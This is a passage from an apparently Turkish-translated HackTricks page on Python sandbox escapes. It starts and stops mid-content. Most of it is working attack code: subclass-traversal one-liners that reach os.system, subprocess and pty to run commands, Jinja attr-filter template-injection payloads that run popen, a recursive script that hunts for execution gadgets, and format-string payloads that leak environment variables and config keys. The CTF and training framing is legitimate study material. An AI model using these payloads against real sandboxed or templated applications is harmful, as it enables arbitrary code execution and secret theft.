[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Aşağıda daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) bulunmaktadır, burada **global değişkenleri** bulabileceğiniz onlarca/**yüzlerce yer** bulunmaktadır.

## Keyfi Yürütme Keşfetme

Burada, daha tehlikeli işlevlerin nasıl kolayca keşfedileceğini ve daha güvenilir saldırılar önerileceğini açıklamak istiyorum.

#### Geçişlerle alt sınıflara erişim

Bu teknikte en hassas olanlardan biri, **temel alt sınıflara erişebilmektir**. Önceki örneklerde bunu `''.__class__.__base__.__subclasses__()` kullanarak yapmıştık, ancak **başka mümkün yollar** da vardır:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Tehlikeli kütüphanelerin bulunması

Örneğin, **`sys`** kütüphanesiyle **keyfi kütüphaneler içe aktarılabilir** olduğunu bildiğinizde, içinde **sys içe aktarılmış olan tüm yüklenmiş modülleri** arayabilirsiniz:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Bunların birçok çeşidi var ve **sadece bir tanesine ihtiyacımız var** komutları çalıştırmak için:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Aynı şeyi **diğer kütüphanelerle** yapabiliriz, bu kütüphaneler komutları **yürütmek** için kullanılabileceğini bildiğimiz kütüphanelerdir:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Ayrıca, kötü amaçlı kütüphaneleri yükleyen modülleri bile arayabiliriz:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Ayrıca, eğer **diğer kütüphanelerin** komutları çalıştırmak için **fonksiyonları çağırabileceğini düşünüyorsanız**, olası kütüphanelerin içindeki fonksiyon isimlerine göre de **filtreleme yapabiliriz**:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Yerleşik Fonksiyonlar, Global Değişkenlerin Yinelemeli Araması...

{% hint style="warning" %}
Bu gerçekten **harika**. Eğer **globals, builtins, open veya herhangi bir nesne** gibi bir nesne arıyorsanız, bu betiği kullanarak **bu nesneyi bulabileceğiniz yerleri yinelemeli olarak bulabilirsiniz**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Bu betiğin çıktısını bu sayfada kontrol edebilirsiniz:

{% content-ref url="broken-reference" %}
[Kırık bağlantı](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format Dizisi

Python'a **biçimlendirilecek bir dize** gönderirseniz, **python dahili bilgilerine** erişmek için `{}` kullanabilirsiniz. Örneğin, globals veya builtins'e erişmek için önceki örnekleri kullanabilirsiniz.

{% hint style="info" %}
Ancak, bir **sınırlama** vardır, yalnızca `.[]` sembollerini kullanabilirsiniz, bu nedenle keyfi kodu yürütemezsiniz, yalnızca bilgi okuyabilirsiniz.\
_**Bu güvenlik açığı aracılığıyla kodu nasıl yürüteceğinizi biliyorsanız, lütfen benimle iletişime geçin.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Normal bir şekilde nokta ile `people_obj.__init__` gibi **özelliklere erişebileceğinizi** ve **parantezlerle** tırnak işareti olmadan `__globals__[CONFIG]` gibi **sözlük öğelerine** erişebileceğinizi unutmayın.

Ayrıca, nesnenin öğelerini numaralandırmak için `.__dict__` kullanabileceğinizi unutmayın `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Biçim dizelerinden diğer ilginç özellikler, belirtilen nesnede **`str`**, **`repr`** ve **`ascii`** fonksiyonlarını **yürütme** olasılığıdır. Bunun için **`!s`**, **`!r`**, **`!a`** eklemeniz gerekmektedir:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Ayrıca, sınıflarda **yeni biçimlendiriciler kodlamak** mümkündür:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Daha fazla örnek** **format** **dizisi** örnekleri [**https://pyformat.info/**](https://pyformat.info) adresinde bulunabilir.

{% hint style="danger" %}
Ayrıca, aşağıdaki sayfada Python dahili nesnelerinden **hassas bilgileri okuyan** araçlar için cihazları kontrol edin:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Hassas Bilgi Açığa Çıkarma Yükleri
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Python Nesnelerini İnceleme

{% hint style="info" %}
Python bytecode hakkında derinlemesine bilgi edinmek isterseniz, bu konuyla ilgili harika bir yazıyı okuyun: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

Bazı CTF'lerde, bayrağın bulunduğu **özel bir fonksiyonun adı** size verilebilir ve bunu çıkarmak için fonksiyonun **iç yapısını** görmek zorunda kalabilirsiniz.

İncelemek için bu fonksiyonu kullanın:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

`dir` is a built-in function in Python that returns a list of names in the current local scope or a specified object's attributes.

In Python, every object has a set of attributes that define its behavior and properties. The `dir` function allows you to explore these attributes and get a better understanding of how an object works.

To use the `dir` function, you simply pass the object as an argument. For example:

```python
dir(object)
```

This will return a list of attribute names associated with the object. You can then use this information to access and manipulate the object's attributes.

Keep in mind that the `dir` function only returns the names of the attributes, not their values. To access the values, you will need to use the appropriate syntax for the specific attribute.

Overall, the `dir` function is a useful tool for exploring and understanding the attributes of Python objects. It can be particularly helpful when working with unfamiliar libraries or modules, as it allows you to quickly see what attributes are available and how to interact with them.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` ve `func_globals` (Aynı) global ortamı elde eder. Örnekte, bazı içe aktarılan modüller, bazı global değişkenler ve içerikleri görülebilir:
```python
get_flag.func_globals
get_flag.__globals__
